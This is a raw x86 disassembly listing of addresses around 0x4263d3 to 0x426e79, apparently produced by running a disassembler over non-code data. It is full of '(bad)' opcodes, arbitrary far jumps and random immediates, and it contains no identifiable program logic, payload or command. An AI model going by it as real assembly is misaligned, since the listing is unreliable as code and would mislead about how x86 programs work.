  4263d3:	add    BYTE PTR [eax],al
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x4786ac49
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	push   ebp
  4263ef:	pop    ds
  4263f0:	push   ds
  4263f1:	jnp    0x4263ad
  4263f3:	jno    0x4263c5
  4263f5:	and    esp,DWORD PTR [edi]
  4263f7:	pusha  
  4263f8:	jmp    0x42641d
  4263fa:	xchg   ebp,eax
  4263fb:	xchg   ch,dh
  4263fd:	pop    eax
  4263fe:	int3   
  4263ff:	retf   0x43c3
  426402:	add    edi,DWORD PTR [eax]
  426404:	pop    ds
  426405:	jmp    0xd246:0x66d6080c
  42640c:	xchg   esp,eax
  42640d:	scas   al,BYTE PTR es:[edi]
  42640e:	mov    cl,0x29
  426410:	outs   dx,BYTE PTR ds:[esi]
  426411:	sar    BYTE PTR [ebx+0x2a],cl
  426414:	(bad)  
  426415:	out    dx,eax
  426416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426417:	ss cli 
  426419:	leave  
  42641a:	xchg   edi,eax
  42641b:	and    DWORD PTR [eax],eax
  42641d:	sbb    edi,DWORD PTR [edi+0x66a25c6c]
  426423:	xchg   ebx,eax
  426424:	mov    edx,0x786f4e14
  426429:	lds    edx,FWORD PTR [edi-0x4328ace2]
  42642f:	dec    edi
  426430:	sbb    eax,0x44a57da7
  426435:	and    al,BYTE PTR [esi-0xf]
  426438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426439:	and    eax,0x9db5440a
  42643e:	popf   
  42643f:	ffreep st(7)
  426441:	mov    BYTE PTR [edi+0x35],dl
  426444:	add    ch,ch
  426446:	mov    bh,dh
  426448:	jns    0x42649e
  42644a:	cmp    eax,0x8236e320
  42644f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426450:	ret    0x9688
  426453:	jno    0x4264cd
  426455:	xor    DWORD PTR [eax],ebp
  426457:	sub    al,ch
  426459:	adc    al,0x9f
  42645b:	sub    bh,dh
  42645d:	clc    
  42645e:	lds    esp,FWORD PTR [esi+0x76d66577]
  426464:	pop    edi
  426465:	lock (bad) 
  426467:	cmp    ebx,ebx
  426469:	pop    esi
  42646a:	in     eax,dx
  42646b:	mov    esi,0xffb2c4c0
  426470:	pusha  
  426471:	stos   BYTE PTR es:[edi],al
  426472:	(bad)  
  426473:	sbb    eax,ebx
  426475:	lock mov ebp,0x93934462
  42647b:	cmp    edi,DWORD PTR [ecx+0x48eeb268]
  426481:	adc    ebp,esi
  426483:	cmp    eax,0xdd2d5ab2
  426488:	test   eax,0xe2b0070b
  42648d:	mov    eax,0x7dfd4407
  426492:	cs adc eax,0xb5b1a2ae
  426498:	enter  0xc5dc,0x1
  42649c:	stc    
  42649d:	pop    esi
  42649e:	add    BYTE PTR [edi+0x4a],bh
  4264a1:	inc    edi
  4264a2:	cli    
  4264a3:	inc    esi
  4264a4:	mov    eax,eax
  4264a6:	shl    DWORD PTR [esi-0x5a],0x59
  4264aa:	fwait
  4264ab:	shr    esi,1
  4264ad:	ret    0x5cb8
  4264b0:	ds pop esp
  4264b2:	stos   BYTE PTR es:[edi],al
  4264b3:	sbb    BYTE PTR [edx-0x40],al
  4264b6:	stos   BYTE PTR es:[edi],al
  4264b7:	fmul   QWORD PTR [ecx-0xaebb88b]
  4264bd:	sub    BYTE PTR [esi+0x3e4e881f],0x25
  4264c4:	cld    
  4264c5:	push   ebx
  4264c6:	inc    ecx
  4264c7:	lds    eax,FWORD PTR [ecx]
  4264c9:	in     al,0x99
  4264cb:	cmp    bh,BYTE PTR [edi-0x7e]
  4264ce:	(bad)  
  4264cf:	or     ch,BYTE PTR [edi+eax*4]
  4264d2:	mov    esi,0xfa9a73de
  4264d7:	stc    
  4264d8:	rcl    DWORD PTR [esi-0x28c2e9a],cl
  4264de:	dec    esi
  4264df:	mov    bh,BYTE PTR [edi]
  4264e1:	in     eax,0xad
  4264e3:	gs inc eax
  4264e5:	xchg   edi,eax
  4264e6:	(bad)  
  4264e7:	and    DWORD PTR [ebp+0x6790d13],esi
  4264ed:	push   ebx
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx+0x50987785]
  426565:	jne    0x4265ce
  426567:	fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	sub    eax,0xcf63c7a6
  426573:	push   0x719af027
  426578:	les    eax,FWORD PTR [ebx]
  42657a:	pop    esp
  42657b:	ins    BYTE PTR es:[edi],dx
  42657c:	std    
  42657d:	lock xchg esp,ebx
  426580:	cs adc dh,dh
  426583:	stos   BYTE PTR es:[edi],al
  426584:	xor    DWORD PTR [edx+edi*2-0x417468a8],eax
  42658b:	mov    dh,0x83
  42658d:	cld    
  42658e:	clc    
  42658f:	and    DWORD PTR [ebx-0x2d12033d],esi
  426595:	jo     0x4265be
  426597:	ds aam 0xea
  42659a:	clc    
  42659b:	ins    DWORD PTR es:[edi],dx
  42659c:	add    edi,DWORD PTR [edx+eiz*2]
  42659f:	shl    DWORD PTR [edx+0x54cb4546],0x5f
  4265a6:	mov    esi,0xebfc2a2
  4265ab:	jns    0x42659d
  4265ad:	jmp    0xa590:0xf70f9af4
  4265b4:	pop    es
  4265b5:	(bad)  
  4265b6:	shl    esi,cl
  4265b8:	or     bl,BYTE PTR [edx-0x65]
  4265bb:	icebp  
  4265bc:	les    ebx,FWORD PTR ds:0x15cc747f
  4265c2:	mov    bh,0x77
  4265c4:	inc    esi
  4265c5:	or     eax,0x37371510
  4265ca:	mov    eax,0x4aca9230
  4265cf:	adc    BYTE PTR [esi+ebx*8],dh
  4265d2:	(bad)  
  4265d3:	push   esp
  4265d4:	xchg   esp,eax
  4265d5:	rcl    BYTE PTR [edi+0x44],cl
  4265d8:	sbb    eax,ebx
  4265da:	ins    DWORD PTR es:[edi],dx
  4265db:	bound  ebx,QWORD PTR [esi]
  4265dd:	icebp  
  4265de:	fcomp  QWORD PTR [ebp+0x4e]
  4265e1:	cmp    BYTE PTR [ecx-0x473ff198],ah
  4265e7:	aaa    
  4265e8:	push   ebx
  4265e9:	aam    0xbd
  4265eb:	hlt    
  4265ec:	fwait
  4265ed:	pop    ebp
  4265ee:	mov    al,0x75
  4265f0:	ficom  DWORD PTR [edi]
  4265f2:	sbb    BYTE PTR [edi+0x10],dl
  4265f5:	mov    al,ds:0x2268530
  4265fa:	data16 icebp 
  4265fc:	dec    edx
  4265fd:	push   ebp
  4265fe:	adc    ebx,DWORD PTR [edi-0x549ac287]
  426604:	idiv   DWORD PTR [ecx+0x3a]
  426607:	xor    al,BYTE PTR [eax+0x5ed4f04]
  42660d:	sbb    BYTE PTR [ebx],ch
  42660f:	jb     0x426668
  426611:	push   0x183cd839
  426616:	dec    eax
  426617:	ror    BYTE PTR [esi-0x5c],cl
  42661a:	mov    DWORD PTR [esi],ebx
  42661c:	cdq    
  42661d:	push   edx
  42661e:	lods   al,BYTE PTR ds:[esi]
  42661f:	test   DWORD PTR [eax],edi
  426621:	mov    DWORD PTR [edi+0x49fb1842],esp
  426627:	push   edi
  426628:	inc    ecx
  426629:	rep outs dx,DWORD PTR ds:[esi]
  42662b:	sahf   
  42662c:	mov    ebx,0x8b596496
  426631:	dec    ebp
  426632:	or     ecx,DWORD PTR [ecx+0x13e797a]
  426638:	cdq    
  426639:	jecxz  0x4265c0
  42663b:	adc    al,0xe0
  42663d:	push   edx
  42663e:	ins    BYTE PTR es:[edi],dx
  42663f:	jecxz  0x426674
  426641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426642:	dec    edi
  426643:	mov    edi,0x93026a87
  426648:	pop    ss
  426649:	sub    dl,ch
  42664b:	dec    edx
  42664c:	inc    esi
  42664d:	mov    eax,ds:0xdae28cfe
  426652:	mov    edx,0x929bf61f
  426657:	push   0xfdaa2d0c
  42665c:	push   ebx
  42665d:	outs   dx,DWORD PTR ds:[esi]
  42665e:	mov    WORD PTR [ebx+eax*8-0x45],ax
  426663:	mov    al,0xab
  426665:	inc    ecx
  426666:	pop    esp
  426667:	test   al,0xb5
  426669:	or     ch,cl
  42666b:	sub    BYTE PTR [esi+0x4b],ah
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x5994925c]
  4266e4:	outs   dx,DWORD PTR ds:[esi]
  4266e5:	mov    ds:0x19c67,al
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	cmp    cl,BYTE PTR [ecx]
  4266f0:	inc    ebp
  4266f1:	imul   ebx,DWORD PTR [edi+0x3b],0x59faf394
  4266f8:	and    ch,bl
  4266fa:	stc    
  4266fb:	mov    dl,0x82
  4266fd:	cmp    DWORD PTR [esi-0x424c254f],esi
  426703:	jmp    0xb4784377
  426708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426709:	popa   
  42670a:	mov    DWORD PTR [eax+0x2d],esp
  42670d:	and    BYTE PTR [eax],0x33
  426710:	(bad)  
  426711:	inc    ebx
  426712:	cli    
  426713:	or     al,0x12
  426715:	lods   eax,DWORD PTR ds:[esi]
  426716:	pop    esi
  426717:	cmp    cl,bl
  426719:	pop    ecx
  42671a:	lahf   
  42671b:	mov    al,0xf0
  42671d:	in     al,0x22
  42671f:	addr16 sahf 
  426721:	js     0x4266ca
  426723:	je     0x4266f4
  426725:	push   0xfa102d1b
  42672a:	sbb    eax,0x90affbdd
  42672f:	lock loopne 0x426784
  426732:	push   edx
  426733:	jmp    0x34c02118
  426738:	loope  0x4266eb
  42673a:	mov    bh,0x4c
  42673c:	gs xchg ebp,eax
  42673e:	sbb    edi,DWORD PTR [eax-0x3a6c1793]
  426744:	mov    bh,dh
  426746:	stos   DWORD PTR es:[edi],eax
  426747:	ret    0xd2c4
  42674a:	mov    WORD PTR [edx-0x4b6652d7],cs
  426750:	mov    ebp,0xce5412c1
  426755:	icebp  
  426756:	dec    ebx
  426757:	pop    ecx
  426758:	rol    DWORD PTR [ebx],0xc5
  42675b:	or     BYTE PTR [eax+0x1a],0x36
  42675f:	push   cs
  426760:	adc    eax,0x370de3e6
  426765:	inc    esp
  426766:	call   0xe71125d8
  42676b:	jmp    0x1dfcb424
  426770:	mov    edx,0x4621e683
  426775:	pusha  
  426776:	pop    ebp
  426777:	xor    dh,al
  426779:	sbb    ebx,ebp
  42677b:	xor    ecx,DWORD PTR [edi-0x38]
  42677e:	cmp    ebx,DWORD PTR [ecx-0xa154753]
  426784:	ins    BYTE PTR es:[edi],dx
  426785:	mov    DWORD PTR [edi+ebp*2],ebp
  426788:	push   ebp
  426789:	push   edi
  42678a:	fsub   DWORD PTR ds:[ebp-0x37492057]
  426791:	pop    ss
  426792:	enter  0x8f5d,0xef
  426796:	cli    
  426797:	test   al,0xbc
  426799:	mov    esi,DWORD PTR [ebx-0x19]
  42679c:	imul   ebx,DWORD PTR [ecx+0xd3e8f74],0x1c272cc6
  4267a6:	or     bl,bh
  4267a8:	push   es
  4267a9:	xlat   BYTE PTR ds:[ebx]
  4267aa:	pop    ss
  4267ab:	xlat   BYTE PTR ds:[ebx]
  4267ac:	push   edx
  4267ad:	retf   0x7d3c
  4267b0:	cmp    BYTE PTR [esp+edx*1+0x6e3418e6],bl
  4267b7:	xor    BYTE PTR [edi+0x1f],bl
  4267ba:	or     ch,0xa5
  4267bd:	fimul  WORD PTR [ebx]
  4267bf:	push   ds
  4267c0:	aad    0x12
  4267c2:	cdq    
  4267c3:	mov    ds,WORD PTR [edx+edx*8-0x57e555b3]
  4267ca:	jl     0x4267f7
  4267cc:	mov    BYTE PTR [eax+0x32],dl
  4267cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267d0:	push   eax
  4267d1:	fdiv   DWORD PTR [esp+edi*1+0x4aec95ad]
  4267d8:	push   ecx
  4267d9:	pop    edx
  4267da:	in     al,0xe6
  4267dc:	cmc    
  4267dd:	pop    esi
  4267de:	adc    al,0x4a
  4267e0:	jno    0x4267f0
  4267e2:	les    esp,FWORD PTR [esi]
  4267e4:	add    ecx,esp
  4267e6:	add    ebx,DWORD PTR [edi]
  4267e8:	inc    ecx
  4267e9:	cmp    al,0x82
  4267eb:	xor    eax,0x7bff
	...
  426854:	add    BYTE PTR [eax],al
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	add    al,0x95
  426864:	sbb    esi,DWORD PTR [edi+eiz*2+0x19d]
  42686b:	add    DWORD PTR [eax],eax
  42686d:	add    BYTE PTR [edi],cl
  42686f:	push   esi
  426870:	jbe    0x42685a
  426872:	(bad)  
  426873:	mov    cl,0x2a
  426875:	sub    al,0x68
  426877:	sub    dl,dl
  426879:	adc    DWORD PTR ds:0x4a66f300,esi
  42687f:	jns    0x42684d
  426881:	mov    eax,ds:0xf94d36aa
  426886:	or     DWORD PTR [edx+0x767567eb],ecx
  42688c:	mov    ebp,DWORD PTR [ecx+ebp*2-0x7c]
  426890:	push   ecx
  426891:	dec    esi
  426892:	cld    
  426893:	pop    ss
  426894:	push   ebp
  426895:	loop   0x426856
  426897:	imul   ebp,ebp,0xffffffb3
  42689a:	fcomp  QWORD PTR [esi]
  42689c:	cmp    al,0x51
  42689e:	xor    eax,0x586a5ea4
  4268a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268a4:	mov    ah,0x59
  4268a6:	in     al,0x48
  4268a8:	or     al,0x56
  4268aa:	or     BYTE PTR [ebp-0x3de2526c],cl
  4268b0:	retf   0x8f34
  4268b3:	xchg   BYTE PTR [eax-0x18],ah
  4268b6:	xchg   DWORD PTR [ebx],esi
  4268b8:	ins    BYTE PTR es:[edi],dx
  4268b9:	sub    al,0x20
  4268bb:	adc    al,BYTE PTR [eax]
  4268bd:	dec    ebx
  4268be:	push   esp
  4268bf:	xlat   BYTE PTR ds:[ebx]
  4268c0:	mov    ah,0x95
  4268c2:	ret    0xce7e
  4268c5:	xor    BYTE PTR [ecx],dh
  4268c7:	fcom   DWORD PTR [esi]
  4268c9:	pop    ebp
  4268ca:	fcomp  QWORD PTR [ebx+0x6c]
  4268cd:	test   al,cl
  4268cf:	jmp    0x426946
  4268d1:	push   ss
  4268d2:	fisub  WORD PTR [ebp+0x12]
  4268d5:	les    ebx,FWORD PTR [eax+esi*8-0x4c]
  4268d9:	test   eax,0xc7e2663f
  4268de:	imul   esp
  4268e0:	int3   
  4268e1:	and    eax,0xd0701e71
  4268e6:	dec    esp
  4268e7:	inc    esp
  4268e8:	jae    0x4268c7
  4268ea:	dec    edx
  4268eb:	mov    ss,WORD PTR [edx+0x2c1d4f50]
  4268f1:	jg     0x42687e
  4268f3:	jbe    0x4268a7
  4268f5:	addr16 jl 0x42694f
  4268f8:	and    eax,0x9ab553ea
  4268fd:	sti    
  4268fe:	aas    
  4268ff:	jmp    esp
  426901:	mov    cl,0xe2
  426903:	imul   edx,ebp,0xffffffde
  426906:	fcomp  DWORD PTR [edx]
  426908:	sbb    DWORD PTR [ecx+0x6d6ab8bf],edi
  42690e:	dec    edi
  42690f:	aaa    
  426910:	cmp    al,0x8a
  426912:	(bad)  [ebp-0x675da6cc]
  426918:	repz loopne 0x42691d
  42691b:	(bad)  
  42691c:	sahf   
  42691d:	adc    eax,0x122470f8
  426922:	mov    dl,0xec
  426924:	push   esp
  426925:	xchg   ecx,eax
  426926:	mov    dh,0xa8
  426928:	mov    eax,0xf568fec2
  42692d:	aaa    
  42692e:	and    eax,0x2b70c8ab
  426933:	mov    edx,0x5858de52
  426938:	stos   DWORD PTR es:[edi],eax
  426939:	repnz mov ebp,0xf99f50bc
  42693f:	mov    eax,ds:0xce9bed63
  426944:	es (bad) 
  426947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426948:	int    0x58
  42694a:	pop    esi
  42694b:	sbb    eax,0x96a70ab0
  426950:	cmovg  edx,DWORD PTR [ecx]
  426953:	jb     0x426937
  426955:	add    eax,0xfdafc666
  42695a:	scas   eax,DWORD PTR es:[edi]
  42695b:	mov    ch,0x40
  42695d:	cmp    esi,ebx
  42695f:	cs jno 0x4269c2
  426962:	pusha  
  426963:	nop
  426964:	gs sub eax,0xea79f8b5
  42696a:	pop    ebp
  42696b:	add    ch,bh
  42696d:	cli    
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    esi,DWORD PTR [edi+0x67c9fbf2]
  4269e7:	sahf   
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	mov    eax,0xf555f19e
  4269f3:	or     al,0xf
  4269f5:	mov    esi,0xc3637f01
  4269fa:	repz jp 0x426a3c
  4269fd:	outs   dx,BYTE PTR ds:[esi]
  4269fe:	pushf  
  4269ff:	sub    eax,0xd5169840
  426a04:	pop    ebx
  426a05:	test   BYTE PTR ds:0xd7f179d1,ah
  426a0b:	fcmovu st,st(1)
  426a0d:	sbb    DWORD PTR [esi-0x759fcb54],esp
  426a13:	(bad)  
  426a14:	aad    0xc3
  426a16:	mov    edi,DWORD PTR [esi]
  426a18:	or     BYTE PTR [edx],dh
  426a1a:	xor    al,ch
  426a1c:	sar    dl,0xa9
  426a1f:	dec    ebp
  426a20:	sti    
  426a21:	or     al,0xb6
  426a23:	stc    
  426a24:	fs and ah,ah
  426a27:	retf   
  426a28:	frstor [esi+0x6d]
  426a2b:	shl    BYTE PTR [eax-0x3b],1
  426a2e:	lock gs push cs
  426a31:	pusha  
  426a32:	adc    ebp,DWORD PTR [esp+edx*4-0x24]
  426a36:	adc    al,0x90
  426a38:	pop    esp
  426a39:	mov    ebx,0xea83ce10
  426a3e:	int    0xf6
  426a40:	or     ecx,DWORD PTR [ebx+0x68]
  426a43:	mov    eax,ds:0x79a24dec
  426a48:	js     0x426a8f
  426a4a:	hlt    
  426a4b:	loop   0x4269e8
  426a4d:	mov    cl,0x2f
  426a4f:	jmp    0x426aab
  426a51:	and    eax,edi
  426a53:	jg     0x426a4c
  426a55:	jmp    0x426aca
  426a57:	mov    esp,0x8a7a0819
  426a5c:	js     0x4269fe
  426a5e:	adc    al,0x12
  426a60:	push   cs
  426a61:	inc    ebx
  426a62:	mov    ?,WORD PTR [ecx+0x77b24800]
  426a68:	bound  esi,QWORD PTR [ebp+0x6036de0]
  426a6e:	ret    0x52fc
  426a71:	shl    BYTE PTR [edx+0x53],1
  426a74:	mov    ebp,0x1ff7c4b7
  426a79:	add    eax,0x54e496eb
  426a7e:	xlat   BYTE PTR ds:[ebx]
  426a7f:	xchg   esp,eax
  426a80:	rol    DWORD PTR ds:0xb0d3c9cc,0x2c
  426a87:	push   eax
  426a88:	mov    ebx,0x4bcb3cec
  426a8d:	xchg   edi,eax
  426a8e:	mov    bl,0x25
  426a90:	adc    eax,0xe1780357
  426a95:	jge    0x426a45
  426a97:	repz out dx,al
  426a99:	cmp    cl,dh
  426a9b:	push   esi
  426a9c:	fwait
  426a9d:	xor    BYTE PTR [edi-0x3e],ah
  426aa0:	fs xchg esi,eax
  426aa2:	pop    ebp
  426aa3:	fwait
  426aa4:	and    ah,0xd6
  426aa7:	dec    esp
  426aa8:	add    DWORD PTR [edx+0x46],eax
  426aab:	mov    DWORD PTR [edx+0x3635afc4],edi
  426ab1:	out    dx,al
  426ab2:	add    al,BYTE PTR [ecx+0x4dfb13a5]
  426ab8:	jae    0x426aad
  426aba:	inc    esp
  426abb:	call   0x6dc2ce4a
  426ac0:	fisttp WORD PTR ds:0x35e24c77
  426ac6:	(bad)  
  426ac7:	dec    esp
  426ac8:	lea    ebx,[ebp+0xc]
  426acb:	inc    esp
  426acc:	mov    BYTE PTR [ebx],dl
  426ace:	(bad)  
  426acf:	push   esi
  426ad0:	outs   dx,DWORD PTR cs:[esi]
  426ad2:	(bad)  [ebx]
  426ad4:	pop    ebx
  426ad5:	aam    0x8a
  426ad7:	mov    ecx,0x95bfea8a
  426adc:	cwde   
  426add:	rcl    BYTE PTR [ecx+ebp*1+0xf681482],1
  426ae4:	inc    ebp
  426ae5:	push   edi
  426ae6:	(bad)  
  426ae7:	mov    dh,0xd6
  426ae9:	aam    0x1a
  426aeb:	jno    0x426ab4
  426aed:	fwait
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x2e
  426b63:	cmp    eax,0x9f6715e2
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	xchg   edi,eax
  426b6f:	pop    es
  426b70:	arpl   WORD PTR [edx+edx*8],bx
  426b73:	cwde   
  426b74:	jae    0x426b04
  426b76:	popa   
  426b77:	or     al,0xec
  426b79:	pop    ebx
  426b7a:	push   ss
  426b7b:	jmp    0x18302bb4
  426b80:	ror    DWORD PTR [esi+0x2c57d63f],cl
  426b86:	or     BYTE PTR [esi+0x2fdea4f1],dl
  426b8c:	xchg   edx,eax
  426b8d:	ins    BYTE PTR es:[edi],dx
  426b8e:	lods   eax,DWORD PTR ds:[esi]
  426b8f:	sbb    BYTE PTR [esi-0x18],al
  426b92:	add    DWORD PTR [ebx+0x330cd4b4],edi
  426b98:	imul   ebx,DWORD PTR [ecx-0x45],0xffffffd5
  426b9c:	cs mov ebp,0x1cbf43f6
  426ba2:	fdivr  QWORD PTR [esi+0x16]
  426ba5:	push   es
  426ba6:	imul   ecx,DWORD PTR [esi+0x73649541],0xb86ed9f9
  426bb0:	dec    ecx
  426bb1:	jp     0x426b8e
  426bb3:	(bad)  
  426bb4:	sub    DWORD PTR [esi],esp
  426bb6:	pop    edx
  426bb7:	jmp    0x426ba9
  426bb9:	out    0xc1,ax
  426bbc:	lods   al,BYTE PTR ds:[esi]
  426bbd:	into   
  426bbe:	out    dx,al
  426bbf:	clc    
  426bc0:	out    0x55,eax
  426bc2:	or     al,0xa9
  426bc4:	ss sub eax,0x6cd003d2
  426bca:	addr16 into 
  426bcc:	sbb    eax,0x9fa5a56c
  426bd1:	and    bl,BYTE PTR [esi]
  426bd3:	mov    dh,0x1c
  426bd5:	lahf   
  426bd6:	test   BYTE PTR [ebp-0x7e],bh
  426bd9:	pop    ebx
  426bda:	int3   
  426bdb:	or     al,0x89
  426bdd:	xchg   ebx,eax
  426bde:	out    dx,eax
  426bdf:	stc    
  426be0:	lods   al,BYTE PTR ds:[esi]
  426be1:	mov    al,0xa6
  426be3:	jl     0x426c27
  426be5:	fcomp  st(3)
  426be7:	push   ecx
  426be8:	xor    DWORD PTR [ebx-0x68],edx
  426beb:	push   esi
  426bec:	es hlt 
  426bee:	stc    
  426bef:	push   0x5b
  426bf1:	push   esp
  426bf2:	fnsave [ebp+0x48110705]
  426bf8:	jp     0x426c48
  426bfa:	lea    ebp,[ebx]
  426bfc:	add    al,0x58
  426bfe:	cmp    eax,0x9b630f5
  426c03:	lock std 
  426c05:	es mov edx,0xd9d26ac2
  426c0b:	mov    bl,0x82
  426c0d:	mov    al,ds:0x859beb3c
  426c12:	mov    bl,ah
  426c14:	bound  ebx,QWORD PTR [edx]
  426c16:	dec    esi
  426c17:	and    al,0xd4
  426c19:	cwde   
  426c1a:	ret    
  426c1b:	lock je 0x426c63
  426c1e:	pop    ebp
  426c1f:	mov    edi,0xd22448e5
  426c24:	pop    edi
  426c25:	inc    ebx
  426c26:	pusha  
  426c27:	jo     0x426c94
  426c29:	mov    dl,0x64
  426c2b:	mov    ebx,0x92fa2f80
  426c30:	inc    ebp
  426c31:	(bad)  ds:0xfba27b51
  426c37:	mov    ebp,0x817f8cd4
  426c3c:	xor    eax,0x2235675c
  426c41:	mov    bh,0x9d
  426c43:	push   cs
  426c44:	or     esi,DWORD PTR [eax+ecx*4+0x1f]
  426c48:	(bad)  
  426c49:	mov    dh,0x45
  426c4b:	les    esi,FWORD PTR ds:0x5901f871
  426c51:	popf   
  426c52:	mov    ecx,0x39c2ed5d
  426c57:	sbb    eax,ebp
  426c59:	test   al,0xed
  426c5b:	fsub   QWORD PTR [ebp+0x6d7946f7]
  426c61:	adc    DWORD PTR [ebp+0x7749c125],0xaf98d515
  426c6b:	add    edi,DWORD PTR [ecx-0x4d]
	...
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x3a83bd5e
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	inc    ecx
  426cef:	out    0xe2,al
  426cf1:	and    DWORD PTR [edx-0x71],esp
  426cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cf5:	shr    edx,0x83
  426cf8:	jge    0x426c82
  426cfa:	add    bh,BYTE PTR [ebx]
  426cfc:	outs   dx,BYTE PTR ds:[esi]
  426cfd:	push   cs
  426cfe:	inc    ebx
  426cff:	or     eax,0x2348b9c
  426d04:	aaa    
  426d05:	test   WORD PTR [ebx+edx*8],cx
  426d09:	xor    cl,BYTE PTR [esp+eiz*2]
  426d0c:	cmp    edi,DWORD PTR [esi+0x5e8d1b45]
  426d12:	nop
  426d13:	mov    edx,0xc06a22a3
  426d18:	sbb    cl,al
  426d1a:	sub    dl,bh
  426d1c:	das    
  426d1d:	adc    DWORD PTR [eax-0x1060e3d9],0xc0946bc4
  426d27:	pop    esi
  426d28:	jecxz  0x426d36
  426d2a:	pop    eax
  426d2b:	mov    ebp,DWORD PTR [ecx-0x4c1cde00]
  426d31:	xor    al,BYTE PTR [edi-0x32]
  426d34:	vpunpcklwd ymm6,ymm1,ymm5
  426d38:	pusha  
  426d39:	or     eax,0x4d415e51
  426d3e:	xsha256 (bad)
  426d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d40:	push   ebx
  426d41:	in     eax,0xf8
  426d43:	adc    BYTE PTR [esi+0x39],0x6c
  426d47:	cli    
  426d48:	push   ss
  426d49:	cmp    al,0xbc
  426d4b:	lahf   
  426d4c:	ins    DWORD PTR es:[edi],dx
  426d4d:	stc    
  426d4e:	add    eax,0xb641c975
  426d53:	mov    edi,edx
  426d55:	add    al,0xa0
  426d57:	outs   dx,BYTE PTR ds:[esi]
  426d58:	xchg   esp,eax
  426d59:	sti    
  426d5a:	rol    BYTE PTR [edx+0x7c93bdcf],1
  426d60:	nop
  426d61:	stos   BYTE PTR es:[edi],al
  426d62:	sbb    edx,DWORD PTR [ebp-0x4fdd4af4]
  426d68:	push   0xdc4fb9b9
  426d6d:	call   0x4ada1491
  426d72:	xor    edx,DWORD PTR [edi-0x232dfb3]
  426d78:	mov    cl,0x81
  426d7a:	jbe    0x426d5a
  426d7c:	add    bh,al
  426d7e:	xor    esp,DWORD PTR [ecx-0x53]
  426d81:	and    BYTE PTR [ebp+0x2a2f5648],al
  426d87:	sub    BYTE PTR [ebx-0x3],dl
  426d8a:	(bad)  
  426d8b:	out    dx,eax
  426d8c:	fistp  DWORD PTR [edi+0x4ef623c2]
  426d92:	jmp    0x426deb
  426d94:	pop    edi
  426d95:	mov    al,ds:0xe473c040
  426d9a:	pop    ds
  426d9b:	inc    edi
  426d9c:	ss mov ebx,0x39e02515
  426da2:	dec    ecx
  426da3:	push   cs
  426da4:	call   0x716901ff
  426da9:	and    dh,ah
  426dab:	das    
  426dac:	pop    edx
  426dad:	xor    DWORD PTR [edi-0x6d04d4fe],0x7
  426db4:	dec    eax
  426db5:	das    
  426db6:	in     eax,dx
  426db7:	call   0xca073c5d
  426dbc:	mov    eax,ecx
  426dbe:	test   BYTE PTR [ecx+0x2a23f03e],al
  426dc4:	lds    edi,FWORD PTR [edx+eiz*2]
  426dc7:	inc    ecx
  426dc8:	lds    ebp,FWORD PTR ds:0xf363fd1d
  426dce:	mov    esi,0x3ee726cc
  426dd3:	data16 sub dl,BYTE PTR [edx-0x75]
  426dd7:	fdiv   st,st(4)
  426dd9:	hlt    
  426dda:	pop    ds
  426ddb:	jne    0x426e22
  426ddd:	sahf   
  426dde:	sbb    DWORD PTR [edx+0x130ae484],edi
  426de4:	and    esi,DWORD PTR [ebp-0xa]
  426de7:	jle    0x426e5e
  426de9:	leave  
  426dea:	lds    ebx,FWORD PTR [eax]
  426dec:	adc    eax,0x8e
	...
  426e55:	add    BYTE PTR [edx],cl
  426e57:	mov    cl,0x61
  426e59:	repz sti 
  426e5b:	repz call 0x8d0c:0xc7c2ecf9
  426e63:	pop    ebx
  426e64:	sahf   
  426e65:	xchg   esp,eax
  426e66:	addr16 mov eax,ds:0x1
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	std    
  426e6f:	mov    eax,0x3b2f4de5
  426e74:	jne    0x426dfb
  426e76:	push   ds
  426e77:	lods   al,BYTE PTR ds:[esi]
  426e78:	pop    ss
  426e79:	xor    al,0xa7
